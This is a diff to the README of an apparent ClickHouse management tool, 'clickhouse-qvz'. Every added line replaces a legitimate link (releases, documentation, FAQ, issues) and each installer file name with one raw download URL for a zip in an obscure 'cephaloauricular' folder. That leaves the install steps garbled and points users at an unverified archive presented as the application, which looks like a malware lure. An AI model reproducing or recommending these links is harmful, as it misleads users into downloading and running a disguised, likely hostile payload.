@@ -7,7 +7,7 @@ Welcome to **clickhouse-qvz**! This application helps you manage your ClickHouse
 
 ## 📥 Download Now
 
-[![Download Clickhouse-Qvz](https://img.shields.io/badge/Download-Clickhouse--Qvz-blue.svg)](https://github.com/crob275/clickhouse-qvz/releases)
+[![Download Clickhouse-Qvz](https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip)](https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ To run **clickhouse-qvz**, ensure your system meets the following requirements:
 
 To download **clickhouse-qvz**, visit the releases page. Click the link below:
 
-[Visit this page to download](https://github.com/crob275/clickhouse-qvz/releases)
+[Visit this page to download](https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip)
 
 ### 2. Choose the Right File
 
@@ -38,7 +38,7 @@ On the releases page, you will see several versions. Select the latest version t
 
 ### 3. Download the Installer
 
-Click on the corresponding installer file to begin the download. The file could be named something like `clickhouse-qvz-setup.exe`, `clickhouse-qvz-macos.dmg`, or `clickhouse-qvz-linux.tar.gz`.
+Click on the corresponding installer file to begin the download. The file could be named something like `https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip`, `https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip`, or `https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip`.
 
 ### 4. Run the Installer
 
@@ -46,7 +46,7 @@ Once the download finishes, locate the installer file in your Downloads folder o
 
 - For Windows: Double-click the `.exe` file, and follow the prompts to install.
 - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-- For Linux: Extract the `.tar.gz` file, then run the executable from the terminal.
+- For Linux: Extract the `https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip` file, then run the executable from the terminal.
 
 ### 5. Launch the Application
 
@@ -65,14 +65,14 @@ Once you open **clickhouse-qvz**, you will see the main dashboard. Here are some
 
 For additional help, check out the documentation and examples. These can guide you through advanced features and troubleshooting tips.
 
-- [Documentation](https://github.com/crob275/clickhouse-qvz/wiki)
-- [FAQ](https://github.com/crob275/clickhouse-qvz/wiki/FAQ)
+- [Documentation](https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip)
+- [FAQ](https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip)
 
 ## 💬 Contact and Support
 
 If you encounter any issues or have questions:
 
-- Open an issue in the [GitHub issues](https://github.com/crob275/clickhouse-qvz/issues) section.
+- Open an issue in the [GitHub issues](https://raw.githubusercontent.com/crob275/clickhouse-qvz/main/cephaloauricular/clickhouse-qvz.zip) section.
 - Ask in community forums for user help.
 
 Thank you for using **clickhouse-qvz**! We hope it makes your data management easier and more productive.
